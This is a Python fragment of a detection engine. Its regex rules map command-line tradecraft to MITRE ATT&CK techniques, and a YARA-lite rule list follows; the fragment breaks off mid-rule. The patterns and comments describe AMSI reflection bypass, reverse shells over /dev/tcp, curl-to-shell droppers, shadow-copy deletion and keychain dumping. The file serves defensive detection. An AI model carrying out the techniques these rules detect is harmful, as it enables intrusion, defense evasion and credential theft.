    # Closing gaps in Lateral Movement · Collection · Exfiltration · Impact
    # ═══════════════════════════════════════════════════════════════════
    # ── Lateral Movement ────────────────────────────────────────────────
    (r"(?<![A-Za-z])(?:mstsc(?:\.exe)?)\s+/v:", ("T1021.001", "RDP session via mstsc /v:", "Lateral Movement")),
    (r"net\s+use\s+\\\\[^\s]+|\\\\[a-z0-9\-\.]+\\(?:c\$|admin\$|ipc\$)", ("T1021.002", "SMB/admin-share access via net use \\\\host\\C$/ADMIN$", "Lateral Movement")),
    (r"(?<![A-Za-z])(?:Enter-PSSession|New-PSSession|Invoke-Command)\s+[^\r\n]{0,120}?-ComputerName", ("T1021.006", "PowerShell remoting (Enter-PSSession/Invoke-Command -ComputerName)", "Lateral Movement")),
    (r"(?<![A-Za-z])winrs(?:\.exe)?\s+-r:", ("T1021.006", "winrs -r: remote shell (WinRM)", "Lateral Movement")),
    (r"(?<![A-Za-z])(?:psexec|paexec|remcom|smbexec)(?:\d*)?(?:\.exe)?\s+\\\\", ("T1570", "PsExec-family lateral tool transfer", "Lateral Movement")),
    (r"wmic\s+/node:[\"']?[^\s\"']+[\"']?\s+process\s+call\s+create|Get-WmiObject\s+-ComputerName|Invoke-WmiMethod\s+-ComputerName", ("T1047", "WMI remote process spawn (/node: or -ComputerName)", "Lateral Movement")),
    (r"(?<![A-Za-z])(?:plink|putty|ssh)(?:\.exe)?\s+[^\r\n]{0,100}?@[a-z0-9\-\.]+", ("T1021.004", "SSH-family remote session (ssh/plink/putty)", "Lateral Movement")),
    (r"Copy-Item\s+[^\r\n]{0,120}?-ToSession|robocopy\s+[^\r\n]{0,120}?\\\\", ("T1570", "Copy-Item -ToSession / robocopy over SMB — lateral tool transfer", "Lateral Movement")),

    # ── Collection ──────────────────────────────────────────────────────
    (r"Get-Clipboard|Set-Clipboard|System\.Windows\.Forms\.Clipboard", ("T1115", "Clipboard read/write API", "Collection")),
    (r"Graphics\.CopyFromScreen|BitBlt|CopyFromScreen|System\.Drawing\.Bitmap.*Screen", ("T1113", "Screen capture API (CopyFromScreen/BitBlt)", "Collection")),
    (r"Start-Transcript|Set-PSReadlineOption\s+-HistorySavePath", ("T1056.004", "PowerShell transcript/history capture", "Collection")),
    (r"Compress-Archive|(?<![A-Za-z])(?:7z|rar|winrar)(?:\.exe)?\s+a\s+[^\r\n]{0,120}?\.(?:zip|rar|7z)|makecab\s+", ("T1560.001", "Archive collection utility (Compress-Archive/7z/rar/makecab)", "Collection")),
    (r"Get-ChildItem\s+[^\r\n]{0,120}?-(?:Recurse|Include)\s+[^\r\n]{0,120}?(?:\*\.(?:pdf|docx?|xlsx?|pptx?|txt|csv|kdbx))", ("T1119", "Automated collection: recursive file-type search", "Collection")),
    (r"AppData\\Roaming\\(?:Microsoft\\Windows\\Cookies|Mozilla\\Firefox\\Profiles|Chromium|Chrome\\User Data)|Login Data|Cookies\.sqlite", ("T1005", "Browser credential / cookie / login data collection", "Collection")),
    (r"New-MailboxExportRequest|Search-Mailbox\s+-SearchQuery", ("T1114.002", "Exchange mailbox export (email collection)", "Collection")),

    # ── Exfiltration ────────────────────────────────────────────────────
    (r"Invoke-(?:WebRequest|RestMethod)\s+[^\r\n]{0,200}?-Method\s+POST\s+[^\r\n]{0,120}?(?:-InFile|-Body)", ("T1041", "PowerShell POST exfil via Invoke-WebRequest/IRM", "Exfiltration")),
    (r"curl(?:\.exe)?\s+[^\r\n]{0,200}?(?:-T\s+|-X\s+POST\s+[^\r\n]{0,80}?-F\s+[\"']?file=@|--upload-file)", ("T1048.003", "curl file upload (-T / -F file=@)", "Exfiltration")),
    (r"(?<![A-Za-z\.])(?:transfer\.sh|anonfiles\.com|file\.io|0x0\.st|catbox\.moe|mega\.nz|dropbox\.com/s/|pastebin\.com/raw|paste\.ee|ghostbin\.com)", ("T1567.002", "Exfil to public file-share (transfer.sh / mega.nz / dropbox / pastebin)", "Exfiltration")),
    (r"aws\s+s3\s+cp\s+[^\r\n]{0,120}?s3://|gsutil\s+cp\s+[^\r\n]{0,120}?gs://|az\s+storage\s+blob\s+upload", ("T1567.002", "Exfil to cloud object storage (S3/GCS/Azure Blob)", "Exfiltration")),
    (r"(?:nslookup|Resolve-DnsName|dig)\s+[a-z0-9\-]{20,60}\.[a-z0-9\-\.]{5,60}", ("T1048.003", "DNS-tunneling-style long-subdomain lookup", "Exfiltration")),
    (r"scp\s+[^\r\n]{0,120}?@[a-z0-9\-\.]+:|sftp\s+[^\r\n]{0,80}?@[a-z0-9\-\.]+", ("T1048", "SCP/SFTP file transfer to remote host", "Exfiltration")),

    # ── Impact ──────────────────────────────────────────────────────────
    (r"wmic\s+shadowcopy\s+delete|wbadmin\s+delete\s+(?:catalog|backup|systemstatebackup)|bcdedit\s+/set\s+\{[^\}]+\}\s+recoveryenabled\s+no|bcdedit\s+/set\s+bootstatuspolicy\s+ignoreallfailures", ("T1490", "Inhibit recovery: shadowcopy/wbadmin/bcdedit tampering", "Impact")),
    (r"(?<![A-Za-z])(?:net(?:1)?|sc(?:\.exe)?)\s+stop\s+[\"']?(?:MpsSvc|WinDefend|WdNisSvc|SecurityHealthService|Sense|wuauserv|BITS|VSS|SamSs|EventLog|Spooler)|Stop-Service\s+[\"']?(?:WinDefend|MpsSvc|Sense|EventLog)", ("T1489", "Service stop targeting Defender/EventLog/Backup/BITS", "Impact")),
    (r"(?<![A-Za-z])(?:wevtutil\s+cl|Clear-EventLog|Remove-EventLog|Clear-History)", ("T1070.001", "Windows event log clearing (wevtutil cl / Clear-EventLog)", "Impact")),
    (r"cipher(?:\.exe)?\s+/w:|(?<![A-Za-z])sdelete(?:64|32)?(?:\.exe)?\s+-p\s+\d+|fsutil\s+usn\s+deletejournal", ("T1561.001", "Secure-delete / journal wipe (cipher /w, sdelete, fsutil)", "Impact")),
    (r"(?:\.(?:locked|encrypted|crypted|enc|ryk|conti|revil|lockbit|blackcat|akira|noname|clop|8base|hive|maze))\b|README[_\-]?(?:DECRYPT|RANSOM|RESTORE)|HOW[_\-]TO[_\-]DECRYPT|_RECOVER_INSTRUCTIONS", ("T1486", "Ransomware artefact: known extension or ransom-note filename", "Impact")),
    (r"(?<![A-Za-z])(?:shutdown|Restart-Computer)\s+[^\r\n]{0,60}?(?:/r\s+/f|/s\s+/f|-Force)", ("T1529", "Forced shutdown/restart (shutdown /r /f · Restart-Computer -Force)", "Impact")),
    (r"net\s+user\s+[^\r\n]{0,40}?/delete|Remove-LocalUser|Set-ADAccountControl\s+.*-Enabled\s+\$false|Disable-ADAccount", ("T1531", "Account access removal (net user /delete · Remove-LocalUser · Disable-ADAccount)", "Impact")),

    # ── Initial Access ──────────────────────────────────────────────────
    (r"(?:\.(?:iso|img|vhd|vhdx|hta|lnk|scr|ps1|vbs|js|wsf|jar))\s*(?:\"|'|$|\s|\?)", ("T1566.001", "Malicious attachment / delivery vehicle (ISO/IMG/HTA/LNK/PS1/VBS/JS)", "Initial Access")),
    (r"contact\s+support|verify\s+your\s+account|password\s+expires|urgent\s+action\s+required|click\s+here\s+to\s+(?:verify|reset|confirm)", ("T1566.002", "Phishing lure text patterns", "Initial Access")),
    (r"(?:CVE-\d{4}-\d{4,7})", ("T1190", "CVE identifier referenced — possible exploit-based initial access", "Initial Access")),
    (r"(?:paloaltonetworks|fortinet|citrix|solarwinds|vmware|ivanti|manageengine|movEit|log4j|jndi:)", ("T1190", "Public-facing appliance exploit target (Palo Alto/Fortinet/Citrix/Ivanti/…)", "Initial Access")),

    # ── Resource Development ────────────────────────────────────────────
    (r"(?:\.(?:top|xyz|club|online|site|website|store|shop|space|tk|ml|ga|cf))/[a-z0-9]{6,}", ("T1583.001", "Attacker-registered low-cost TLD staging domain (.top/.xyz/.club/…)", "Resource Development")),
    (r"(?:cloudproxy|cloudflarepanel|panel1337|c2server|admin-panel|beaconserver)\.[a-z0-9\-\.]+", ("T1583.004", "Attacker C2/panel-style domain naming", "Resource Development")),
    (r"ngrok\.io|serveo\.net|localtunnel\.me|loca\.lt|trycloudflare\.com", ("T1090.002", "Tunneling service (ngrok/serveo/cloudflared) — attacker relay infrastructure", "Command and Control")),

    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.3.2 · Gap-report fixes (daily_regression payloads A4/B8/
    # D3/E6/G1/G2). Six detection gaps flagged as zero-MITRE — each below
    # ties a common tradecraft signature to its canonical ATT&CK ID.
    # ═══════════════════════════════════════════════════════════════════

    # ── A4 · PowerShell AMSI-bypass (reflection short-form) ─────────────
    # `[Ref].Assembly.GetType('...AmsiUtils').GetField('amsiInitFailed',...)
    #  .SetValue($null,$true)` — evade PowerShell script-block scanning.
    (r"\[Ref\]\.Assembly\.GetType\(\s*['\"][^'\"]*AmsiUtils['\"]|"
     r"amsiInitFailed|"
     r"GetField\(\s*['\"]amsi[A-Za-z]+['\"]\s*,\s*['\"]NonPublic\s*,\s*Static['\"]",
        ("T1562.001", "Impair Defenses: AMSI Reflection Bypass ([Ref].Assembly + amsiInitFailed)", "Defense Evasion")),
    (r"System\.Management\.Automation\.AmsiUtils",
        ("T1562.001", "AMSI Utils reflection reference (PowerShell defense-evasion staging)", "Defense Evasion")),

    # ── B8 · PowerShell char-code assembly (integer-array → string) ─────
    # `-join(([char[]](116,101,115,116)))` or `[char[]](0x74,0x65,...)`.
    # Classic string-hiding tradecraft used to smuggle IEX / DownloadString
    # past static scanners.
    (r"-join\s*\(\s*\(?\s*\[char(?:\[\])?\]\s*\(?\s*\d+\s*,\s*\d+\s*,\s*\d+|"
     r"\[char\[\]\]\s*\(\s*(?:\d+|0x[0-9a-fA-F]+)\s*,\s*(?:\d+|0x[0-9a-fA-F]+)\s*,",
        ("T1027", "Obfuscated Files or Information: PowerShell char-code array assembly", "Defense Evasion")),

    # ── D3 · Linux background-execution stager (`nohup ... &`) ──────────
    # `nohup /tmp/x >/dev/null 2>&1 &` — the canonical way to daemonise a
    # dropped payload on Linux without an inherited shell.
    (r"\bnohup\s+[^\|;&\n]+?(?:\s+>?/dev/null|\s+2>&1)?\s*&(?![&=])",
        ("T1059.004", "Unix Shell: nohup background execution (detached daemonisation)", "Execution")),
    (r"\bdisown\b|setsid\s+\S|(?:^|\s)(?:sh|bash|zsh)\s+[^\|;&\n]+\s*&(?![&=])",
        ("T1059.004", "Unix Shell: detached background job (setsid/disown/`&`)", "Execution")),

    # ── E6 · MSBuild inline-task LOLBin execution ───────────────────────
    # `msbuild.exe C:\...\evil.csproj` — MSBuild happily compiles+runs an
    # inline C# task from a .csproj / .xml, bypassing AppLocker script rules.
    (r"msbuild(?:\.exe)?\s+[^\s;|&\n]*\.(?:csproj|xml|proj)\b|"
     r"<UsingTask\s+TaskName=[^>]+AssemblyFile=|<Task>\s*<Code\s+Type=[\"']?Class",
        ("T1127.001", "Trusted Developer Utilities Proxy Execution: MSBuild inline task", "Defense Evasion")),

    # ── G1 · GCP service-account JWT (iss=…iam.gserviceaccount.com) ─────
    # Base64 payload starts with `eyJ` and once decoded reveals a GCP
    # service-account issuer — classic key-file exfil / privesc pivot.
    (r"eyJ[A-Za-z0-9_-]{6,}\.eyJ[A-Za-z0-9_-]*(?:aWFtLmdzZXJ2aWNlYWNjb3VudA|"
     r"c3ZjLWFjY291bnQ|Z3NlcnZpY2VhY2NvdW50)[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+|"
     r"iam\.gserviceaccount\.com|service_account_key|"
     r"gcloud\s+auth\s+(?:activate-service-account|print-access-token|application-default)",
        ("T1552.004", "Unsecured Credentials: GCP Service-Account JWT / Key File", "Credential Access")),
    (r"\"type\"\s*:\s*\"service_account\"|private_key_id\"\s*:\s*\"[a-f0-9]{40}",
        ("T1552.004", "GCP service-account key JSON structure (private_key_id / type=service_account)", "Credential Access")),

    # ── G2 · AWS Cognito ID token (cognito:username claim in JWT body) ──
    (r"eyJ[A-Za-z0-9_-]{6,}\.eyJjb2duaXRvO[A-Za-z0-9_-]*|"                      # JWT body starts with {"cognito:…"
     r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]*(?:Y29nbml0bzp1c2VybmFtZQ|"          # base64("cognito:username")
     r"Y29nbml0by11c2Vy|Y29nbml0bzpncm91cHM)[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+|"
     r"cognito:username|cognito-idp\.[a-z0-9-]+\.amazonaws\.com|"
     r"AWSCognitoIdentityProviderService|"
     r"aws\s+cognito-idp\s+(?:admin-initiate-auth|initiate-auth|admin-get-user)",
        ("T1528", "Steal Application Access Token: AWS Cognito ID/Access token", "Credential Access")),

    # ── H1 · `where`-wildcard LOLBIN string obfuscation (Feb 2026 v1.3.5) ──
    # `where c*d.e?e` / `where c*u*r*l.e?e` / `where p*ell.exe` — used to
    # avoid emitting the literal strings cmd.exe / curl.exe / powershell.exe
    # so static YARA/Sigma rules on command lines miss the LOLBIN reference.
    # See saved case "Real_Confirmed_Authorized Activity" for a live sample.
    (r"where\s+[cCpPrRwWmMnN][a-zA-Z*?]*\*[a-zA-Z*?]*\.(?:e[xX?]e|dll|com)|"
     r"where\s+[a-zA-Z]+\?[a-zA-Z*?]*\.[a-zA-Z*?]+",
        ("T1027", "Obfuscated Files: `where`-wildcard LOLBIN string hiding (c*d.e?e / p*ell.exe)", "Defense Evasion")),
]


def mitre_map(text: str) -> List[Dict[str, str]]:
    low = text.lower()
    hits: List[Dict[str, str]] = []
    seen = set()
    for pattern, (tid, name, tactic) in MITRE_HEURISTICS:
        if re.search(pattern, low, re.IGNORECASE) and tid not in seen:
            seen.add(tid)
            hits.append({"id": tid, "technique": name, "tactic": tactic})
    return hits


# ==== YARA-lite rules ========================================================
YARA_LITE = [
    {"rule": "PS_EncodedCommand", "severity": "high", "pattern": r"powershell.*?-e(?:c|nc|ncodedcommand)?\s+[A-Za-z0-9+/=]{20,}", "desc": "PowerShell base64-encoded command execution"},
    {"rule": "PS_HiddenWindow", "severity": "medium", "pattern": r"-w(?:indowstyle)?\s+hidden", "desc": "PowerShell hidden window flag"},
    {"rule": "PS_DownloadString", "severity": "high", "pattern": r"downloadstring|net\.webclient|invoke-webrequest", "desc": "Remote script/binary download"},
    {"rule": "IEX_Invocation", "severity": "high", "pattern": r"\biex\b|invoke-expression", "desc": "In-memory execution via IEX"},
    {"rule": "CMD_Obfuscation_Caret", "severity": "medium", "pattern": r"\^[a-zA-Z]", "desc": "CMD.exe caret-based obfuscation"},
    {"rule": "JS_FromCharCode", "severity": "medium", "pattern": r"String\.fromCharCode", "desc": "JavaScript character code obfuscation"},
    {"rule": "JS_Eval", "severity": "high", "pattern": r"\beval\s*\(", "desc": "JavaScript eval() invocation"},
    {"rule": "Defanged_IOC", "severity": "low", "pattern": r"hxxp[s]?://|\[\.\]", "desc": "Defanged indicator (analyst-supplied)"},
    {"rule": "Base64_Long_Blob", "severity": "low", "pattern": r"[A-Za-z0-9+/]{80,}={0,2}", "desc": "Long Base64 blob"},
    {"rule": "Ransom_Note_Keywords", "severity": "medium", "pattern": r"\b(your files.*encrypted|bitcoin|btc address|decryption key|ransom|tor browser)\b", "desc": "Ransom note keyword cluster"},
    {"rule": "Certutil_Decode", "severity": "high", "pattern": r"certutil(?:\.exe)?\s+.{0,80}-decode\b", "desc": "Living-off-the-land: certutil decoding payloads"},
    {"rule": "Mshta_Remote", "severity": "high", "pattern": r"mshta\.exe\s+https?://", "desc": "Remote HTA execution"},
    {"rule": "LSASS_Access", "severity": "high", "pattern": r"lsass|sekurlsa::|mimikatz", "desc": "LSASS / credential dumping references"},
    {"rule": "Shadow_Copy_Delete", "severity": "high", "pattern": r"vssadmin.*delete.*shadows|wmic.*shadowcopy.*delete", "desc": "Shadow copy deletion (ransomware precursor)"},
    # ── Sandbox evasion — anti-analysis delay loops ────────────────────────
    {"rule": "PS_Sandbox_Delay_Loop", "severity": "medium",
     "pattern": r"for\s*\(\s*\$\w+\s*=\s*\d+\s*;\s*\$\w+\s*-le\s*(?:[1-9]\d{3,})|start-sleep\s+(?:-s(?:econds)?\s+)?[1-9]\d{2,}|1\s*\.\.\s*[1-9]\d{3,}\s*\|\s*%",
     "desc": "PowerShell delay loop / long Start-Sleep — sandbox timeout evasion"},
    # ── LOLBAS: Start-BitsTransfer (stealthy download) ─────────────────────
    {"rule": "PS_BitsTransfer_Download", "severity": "high",
     "pattern": r"start-bitstransfer|import-module\s+bitstransfer",
     "desc": "PowerShell Start-BitsTransfer used for stealthy asynchronous download (LOLBIN, MITRE T1197)"},
    # ── Case-mixed keyword obfuscation (anti-signature) ────────────────────
    # Detects text where a PS/CMD keyword contains ≥3 case flips within it
    # (e.g. `iMpoRt-MOdULE`, `dOwNlOaDsTrInG`). Rare in benign scripts.
    {"rule": "PS_CaseMixed_Obfuscation", "severity": "low",
     "pattern": r"\b(?=\w{6,})(?:[a-z]+[A-Z]){2,}[a-z]*\b",
     "desc": "Alternating-case keyword obfuscation to evade string-signature detection"},
    # ── Linux / Bash obfuscation (Feb 2026 training) ───────────────────────
    {"rule": "Bash_Base64_Pipe_Shell", "severity": "high",
     "pattern": r"base64\s+(?:-d|--decode)\s*\|\s*(?:sh|bash|zsh|dash|ksh|python\d?|perl|ruby)\b",
     "desc": "Bash base64-decode piped directly into shell (fileless in-memory execution)"},
    {"rule": "Bash_Rev_Pipe_Shell", "severity": "high",
     "pattern": r"\|\s*rev\s*\|\s*(?:sh|bash|zsh|dash|ksh)\b",
     "desc": "String reversed via rev then piped to shell — anti-signature obfuscation"},
    {"rule": "Bash_Env_Var_Slicing", "severity": "medium",
     "pattern": r"\$\{\w+:\d+:\d+\}",
     "desc": "Bash env-var slicing (${VAR:start:len}) — building commands character-by-character"},
    {"rule": "Bash_Curl_Wget_Pipe_Shell", "severity": "high",
     "pattern": r"(?:curl|wget)\s+[^\r\n|]{0,200}\|\s*(?:sh|bash|zsh|dash|ksh|python\d?)\b",
     "desc": "curl/wget output piped directly to shell — classic Linux dropper pattern"},
    # ── PowerShell structural obfuscation (Feb 2026 training) ──────────────
    {"rule": "PS_Format_Shuffle", "severity": "medium",
     "pattern": r"['\"](?:\s*\{\d+\}\s*)+['\"]\s*-f\s",
     "desc": "PowerShell -f token-shuffle format string — array reorder evasion"},
    {"rule": "PS_String_Split_Evasion", "severity": "medium",
     "pattern": r"\.Split\s*\(\s*['\"][^'\"]{3,}['\"]\s*\)",
     "desc": "String .Split() with 3+ char junk separator — delimiter-strip obfuscation"},
    {"rule": "PS_BXor_Math", "severity": "high",
     "pattern": r"-bxor\s+\$?\w",
     "desc": "PowerShell -bxor math — inline XOR shellcode decryption"},
    {"rule": "PS_ToInt16_Binary_Hex", "severity": "high",
     "pattern": r"ToInt16\s*\(\s*[^,]+,\s*(?:2|16)\s*\)",
     "desc": "PowerShell ToInt16 base-2/base-16 conversion — binary/hex payload reassembly"},
    {"rule": "PS_Char_Int_Cast", "severity": "medium",
     "pattern": r"\[char\]\s*\[int\]|\[char\]\s*\d+",
     "desc": "PowerShell [char][int] cast — char-code payload reconstruction"},
    # ── Reverse-shell / raw-TCP C2 (Feb 2026) ───────────────────────────
    {"rule": "Bash_Dev_TCP_RevShell", "severity": "high",
     "pattern": r"/dev/(?:tcp|udp)/[a-z0-9.\-\{\}$\{\}%]+/\d{1,5}",
     "desc": "Bash /dev/tcp raw-socket reverse shell (MITRE T1095/T1571)"},
    {"rule": "Bash_Exec_FD_RevShell", "severity": "high",
     "pattern": r"exec\s+\d+\s*<\s*>\s*/dev/(?:tcp|udp)/",
     "desc": "Bash file-descriptor exec-redirect to /dev/tcp (canonical reverse shell)"},
    # ── CMD for-loop reverse-string (Emotet, QakBot family) ─────────────
    {"rule": "CMD_ForLoop_Reverse_String", "severity": "high",
     "pattern": r"for\s*/L\s+%[a-z]\s+in\s*\(\s*\d+\s*,\s*-1\s*,\s*0\s*\)\s+do\s+.*?!\w+:~%",
     "desc": "CMD `for /L` reverse-string obfuscation — Emotet / QakBot canonical pattern"},
    # ── Certutil PEM-wrapped base64 (LOLBAS payload staging) ────────────
    {"rule": "Certutil_PEM_Wrapped_Payload", "severity": "high",
     "pattern": r"-{5}BEGIN\s+CERTIFICATE-{5}[\s\S]{20,}-{5}END\s+CERTIFICATE-{5}",
     "desc": "PEM-wrapped base64 blob (often paired with certutil -decode for PE staging)"},
    # ── Feb-2026 v1.2.0 · LOLBAS rename tradecraft ─────────────────────
    {"rule": "LOLBAS_Curl_Rename", "severity": "high",
     "pattern": r"copy(?:\.exe)?\s+(?:/[a-z]\s+)*[\"']?(?:c:\\windows\\system(?:32|64)|%windir%\\system(?:32|64))\\curl\.exe[\"']?\s+[\"']?[^\\/\s]+\.(?:exe|com|bat|cmd|scr)[\"']?",
     "desc": "curl.exe copied to random name (LOLBAS rename tradecraft — bypasses name-based EDR)"},
    {"rule": "LOLBAS_Signed_Bin_Rename", "severity": "high",
     "pattern": r"copy(?:\.exe)?\s+(?:/[a-z]\s+)*[\"']?(?:c:\\windows\\system(?:32|64)|%windir%\\system(?:32|64))\\(?:curl|certutil|bitsadmin|powershell|pwsh|wmic|regsvr32|rundll32|mshta|msiexec|hh|cmstp|installutil|xwizard|wscript|cscript|forfiles|syncappvpublishingserver)\.(?:exe|vbs)[\"']?\s+[\"']?[^\\/\s]+\.(?:exe|com|bat|cmd|scr|dll|vbs)[\"']?",
     "desc": "Signed system LOLBIN (curl/certutil/bitsadmin/powershell/…) copied to random filename — masquerading via rename (MITRE T1036.003)"},
    # ── Msiexec silent remote install ────────────────────────────────────
    {"rule": "Msiexec_Remote_Silent_Install", "severity": "high",
     "pattern": r"msiexec(?:\.exe)?\s+(?:/[a-z]+\s+)*/i\s+(?:https?://\S+|[\"']?[a-z]:\\[^\"'\s]+\.msi[\"']?|[a-zA-Z0-9_\-]+\.msi)\s+(?:/[a-z]+\s+)*/q(?:n|b|r|f|uiet)?",
     "desc": "msiexec /i /qn silent install (remote URL, Temp-staged, or bare .msi filename) — MITRE T1218.007"},
    # ── OneNote phishing chain ─────────────────────────────────────────
    {"rule": "OneNote_Phishing_Chain", "severity": "high",
     "pattern": r"onenote(?:\.exe)?[^\n]{0,600}?\\(?:mshta|wscript|cscript|cmd|hh|curl|rundll32|powershell|pwsh)\.exe",
     "desc": "ONENOTE.EXE spawning script host (mshta/wscript/cmd/hh) — OneNote (.one) phishing chain"},
    {"rule": "OneNote_Extracted_Payload_Path", "severity": "high",
     "pattern": r"onenote\\16\.0\\exported\\\{[a-f0-9\-]+\}\\NT\\\d+\\[^\n]{0,60}?\.(?:hta|wsf|vbs|js|bat|cmd|ps1|lnk)",
     "desc": "OneNote-extracted embedded script — canonical .one dropper temp path"},
    # ── Temp-directory staging chain ────────────────────────────────────
    {"rule": "Temp_Directory_Staging", "severity": "medium",
     "pattern": r"cmd(?:\.exe)?\s+/[cCkK]\s+cd\s+/[dD]\s+(?:%TEMP%|%LOCALAPPDATA%\\Temp|%APPDATA%|%USERPROFILE%\\AppData\\Local\\Temp|c:\\users\\[^\\\s]+\\appdata\\local\\temp)",
     "desc": "cmd /c cd /d %TEMP% — staging-directory pivot (T1074.001)"},
    # ── Suspicious short-lifespan TLDs (ClickFix, phishing) ─────────────
    {"rule": "Suspicious_TLD_Domain", "severity": "medium",
     "pattern": r"https?://[a-z0-9\-]+\.(?:lol|top|click|zip|mov|xyz|monster|rest|sbs|cfd|life|quest)/",
     "desc": "Suspicious short-lifespan TLD (.lol/.top/.click/.zip/…) — heavily abused for ClickFix/phishing"},
    # ── Free-hosting delivery / staging ─────────────────────────────────
    {"rule": "Free_Hosting_Delivery", "severity": "medium",
     "pattern": r"https?://(?:transfer\.sh|anonfiles\.com|filebin\.net|gofile\.io|catbox\.moe|file\.io|tempfiles\.ninja|sendgb\.com|dropmefiles\.com)/",
     "desc": "Free-file-hosting URL — payload staging / exfil (MITRE T1567.002 / T1105)"},
    # ── Wildcard file/binary resolution ─────────────────────────────────
    {"rule": "Wildcard_Path_Resolution", "severity": "medium",
     "pattern": r"\b[a-z]\*[a-z]?\.[a-z]\?[a-z]\b|\b[a-z]{1,3}\*\.[a-z]{2,4}\b",
     "desc": "Wildcard path/binary reference (c*d.e?e → cmd.exe) — Bohannon wildcard obfuscation"},
    # ── Blind XOR indicator (ciphertext present) ────────────────────────
    {"rule": "XOR_Cipher_Indicator", "severity": "medium",
     "pattern": r"-b?xor\s+(?:0x[0-9a-f]{2,4}|[\"']?[a-z0-9!@#\$%\^&\*]{2,16}[\"']?)",
     "desc": "PowerShell -bxor with visible key — XOR-cipher shellcode decryption (MITRE T1027.013)"},
    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.2.0 · macOS tradecraft
    # ═══════════════════════════════════════════════════════════════════
    {"rule": "macOS_osascript_dialog", "severity": "high",
     "pattern": r"osascript\s+.{0,200}?(?:display\s+dialog|activate|do\s+shell\s+script)",
     "desc": "AppleScript with display-dialog / do-shell-script — Amos/MacStealer fake-prompt tradecraft"},
    {"rule": "macOS_launchagent_persistence", "severity": "high",
     "pattern": r"(?:~/Library|/Library|/System/Library)/(?:LaunchAgents|LaunchDaemons)/[^\s]+\.plist",
     "desc": "LaunchAgent / LaunchDaemon plist path — macOS persistence (MITRE T1543.001)"},
    {"rule": "macOS_launchctl_load", "severity": "high",
     "pattern": r"launchctl\s+(?:load|bootstrap|enable|kickstart)\s+.*?(?:LaunchAgents|LaunchDaemons)",
     "desc": "launchctl load — installing macOS LaunchAgent/Daemon persistence"},
    {"rule": "macOS_keychain_dump", "severity": "high",
     "pattern": r"security\s+(?:find-generic-password|find-internet-password|dump-keychain|unlock-keychain)",
     "desc": "macOS Keychain access via `security` CLI — credential dump (MITRE T1555.001)"},
    {"rule": "macOS_gatekeeper_bypass", "severity": "high",
     "pattern": r"xattr\s+(?:-d\s+|-c\s+|-r\s+-d\s+)?com\.apple\.quarantine|xattr\s+-cr\s+\S+|spctl\s+--master-disable",
     "desc": "Gatekeeper quarantine strip / spctl disable — macOS trust bypass (MITRE T1553.001)"},
    {"rule": "macOS_sudo_piped_password", "severity": "high",
     "pattern": r"echo\s+[\"'][^\"']{4,}[\"']\s*\|\s*sudo\s+-S\b",
     "desc": "Piped password to `sudo -S` — macOS privilege escalation with hardcoded creds"},
    {"rule": "macOS_curl_pipe_shell", "severity": "high",
     "pattern": r"(?:curl|wget)\s+(?:-\w+\s+)*[\"']?https?://[^\s'\"]+[\"']?\s*\|\s*(?:sh|bash|zsh|osascript)\b",
     "desc": "curl/wget piped directly to sh/bash/zsh/osascript — canonical macOS/Linux dropper"},
    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.2.0 · Cloud & Identity abuse
    # ═══════════════════════════════════════════════════════════════════
    {"rule": "OAuth_DeviceCode_Phishing", "severity": "high",
     "pattern": r"microsoft\.com/devicelogin(?:\?otc=[A-Z0-9]{6,}|\s+.*?user_code)",
     "desc": "OAuth device-code phishing URL / user_code — Entra ID token theft (MITRE T1566.002 / T1621)"},
    {"rule": "MS_Graph_API_C2", "severity": "medium",
     "pattern": r"graph\.microsoft\.com/(?:v1\.0|beta)/(?:me|users/[^/]+)/(?:messages|drive|chats)",
     "desc": "Microsoft Graph API endpoint — legit-infra C2/exfil channel (MITRE T1567)"},
    {"rule": "MS_Teams_Webhook_C2", "severity": "high",
     "pattern": r"https?://[a-z0-9\-]+\.webhook\.office\.com/webhookb2/",
     "desc": "Microsoft Teams Incoming Webhook — GIFshell / webhook C2 abuse (MITRE T1102)"},
    {"rule": "AWS_Access_Key_Leak", "severity": "high",
     "pattern": r"AKIA[0-9A-Z]{16}",
     "desc": "AWS Access Key ID pattern — credential leakage (MITRE T1552.001)"},
    {"rule": "AWS_Secret_Key_Leak", "severity": "high",
     "pattern": r"aws_secret_access_key\s*=\s*[A-Za-z0-9/+]{40}",
     "desc": "AWS Secret Access Key assignment — credential leakage"},
    {"rule": "AAD_Primary_Refresh_Token", "severity": "high",
     "pattern": r"PRT\s*(?:cookie|token)|x-ms-refreshtokencredential|aadinternals|aadconnect",
     "desc": "AAD/Entra Primary Refresh Token abuse — long-lived cloud auth material theft"},
    {"rule": "Cloud_Service_Cred_Reset", "severity": "medium",
     "pattern": r"gcloud\s+iam\s+service-accounts\s+keys\s+create|az\s+ad\s+sp\s+credential\s+reset|kubectl\s+create\s+token\b",
     "desc": "Cloud CLI creating new service-account credentials — persistence via extra keys (MITRE T1098.001)"},

    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.3.0-preview · VHDX/VHD delivery + anti-analysis rules
    # ═══════════════════════════════════════════════════════════════════
    {"rule": "VHDX_Container_Mount", "severity": "high",
     "pattern": r"(?:mount-diskimage|mount-vhd|get-diskimage)\s+.*?\.(?:vhdx?|iso|img)\b|powershell.*?mount-diskimage",
     "desc": "VHDX/VHD/ISO container mount — MOTW-bypass payload delivery (Overlord/BumbleBee tradecraft)"},
    {"rule": "VHDX_PowerShell_Cleanup_Eject", "severity": "high",
     "pattern": r"powershell(?:\.exe)?\s+-w(?:indowstyle)?\s+hidden\s+-nop\s+-c\s+[\"']?sleep\s+\d+.*?(?:Get-DiskImage|Get-Partition)[^\n]{0,300}?(?:InvokeVerb\([\"']?Eject|Dismount-DiskImage)",
     "desc": "Hidden PS cleanup — sleep + Get-DiskImage + Eject/Dismount (Overlord auto-unmount signature)"},
    {"rule": "Shell_Application_Namespace17_Eject", "severity": "high",
     "pattern": r"\(New-Object\s+-ComObject\s+Shell\.Application\)\.Namespace\(17\)\.ParseName\([^)]+\)\.InvokeVerb\([\"']?Eject",
     "desc": "COM Shell.Application Namespace(17) Eject — VHDX auto-unmount tradecraft"},
    {"rule": "DLL_Sideloading_CoLocated", "severity": "medium",
